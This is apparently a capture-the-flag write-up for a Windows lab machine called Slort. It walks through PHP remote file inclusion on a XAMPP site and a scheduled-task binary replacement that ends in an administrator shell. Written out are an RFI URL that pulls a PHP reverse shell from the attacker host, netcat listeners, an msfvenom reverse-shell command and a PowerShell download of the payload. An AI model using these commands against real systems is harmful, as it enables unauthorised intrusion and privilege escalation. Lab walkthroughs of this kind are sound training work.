#Windows #RFI #PHP #XAMPP #ScheduledTask #BinaryReplacement #msfvenom #LFI

## Overview

Slort is a Windows machine where a PHP remote file inclusion vulnerability on a XAMPP-backed site gives the initial foothold. Privilege escalation exploits a scheduled task that runs `TFTP.EXE` from a user-writable `C:\Backup` directory every five minutes. Renaming the original binary and dropping a reverse-shell payload in its place produces an administrator shell without needing any exploit.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql?
4443/tcp open  http          Apache httpd 2.4.43 (Win64) PHP/7.4.6
8080/tcp open  http          Apache httpd 2.4.43 (Win64) PHP/7.4.6
```

Two Apache/PHP instances on ports 4443 and 8080. SMB signing not required. FTP on 21 with FileZilla.

### Web Enumeration

GoBuster against port 8080 found a `/site` directory that redirected to:

```
http://192.168.180.53:8080/site/index.php?page=main.php
```

The `?page=` parameter immediately suggested file inclusion. Testing with a single quote:

```
http://192.168.180.53:8080/site/index.php?page=%27
```

The error confirmed PHP `include()` with unsanitized input:

```
Warning: include('): failed to open stream: No such file or directory in
  C:\xampp\htdocs\site\index.php on line 4
Warning: include(): Failed opening ''' for inclusion
  (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\site\index.php on line 4
```

> **Why `include()` errors are diagnostic gold:** the error message discloses the full server-side path (`C:\xampp\htdocs\site\index.php`), confirms PHP's `include()` is the mechanism, and reveals the `include_path`. This tells an attacker the XAMPP root layout and confirms RFI is possible if `allow_url_include` is enabled, which it is when the error shows the application successfully loaded `main.php` from a URL before.

## Foothold

### Remote File Inclusion → Shell as rupert

With `include()` confirmed, the next test was whether the server would fetch and execute a remote PHP file. A PHP reverse shell was hosted on Kali's HTTP server:

```sh
python3 -m http.server 80
```

Triggered via RFI:

```
http://192.168.180.53:8080/site/index.php?page=http://192.168.45.244/phpshell.php
```

The target fetched the shell:

```
192.168.180.53 - - "GET /phpshell.php HTTP/1.0" 200 -
```

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.53] 51046

C:\xampp\htdocs\site>whoami
slort\rupert
```

```powershell
C:\Users\rupert\Desktop>type local.txt
‹redacted›
```

## Privilege Escalation

### Scheduled Task Binary Replacement, C:\Backup\TFTP.EXE

Manual filesystem enumeration surfaced a `C:\Backup` directory at the root of the C drive. An `info.txt` within it documented the scheduled task:

```powershell
C:\Backup>type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

> **Why a scheduled task in a user-writable directory is instant privilege escalation:** Windows scheduled tasks run under a configured account, often SYSTEM or a local admin. If the binary the task invokes sits in a directory where a low-privilege user can write, the attacker simply replaces the binary. The next time the task fires, the scheduler invokes the attacker's payload with the task's privilege level, no exploits, no race conditions, just a write and a wait.

Checking write permission on `C:\Backup`, confirmed by the rename succeeding:

```powershell
C:\Backup>move TFTP.EXE TFTP.bak
        1 file(s) moved.
```

A reverse-shell binary was generated and named to match:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=53 \
  -f exe -o TFTP.EXE
```

Downloaded to the target via PowerShell:

```powershell
PS C:\Backup> iwr -uri http://192.168.45.244:8000/TFTP.EXE -OutFile TFTP.EXE
```

Listener opened on port 53. After waiting up to five minutes for the task to fire:

## Root / SYSTEM

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.53] 51094

C:\WINDOWS\system32>whoami
slort\administrator
```

```powershell
C:\Users\Administrator\Desktop>type proof.txt
‹redacted›
```

## Takeaways

- **A `?page=` parameter backed by PHP `include()` is RFI until proven otherwise.** The error message confirmed the mechanism and disclosed the filesystem layout in one request.
- **`info.txt` files in unusual directories document attacker-useful automation.** A scheduled task description file left in a writable directory described the exact binary name, path, and execution interval, all the information needed to plan the replacement.
- **Binary replacement attacks need only write permission and patience.** No exploit, no UAC bypass, just a renamed legitimate binary and a five-minute wait. The task scheduler does the rest.
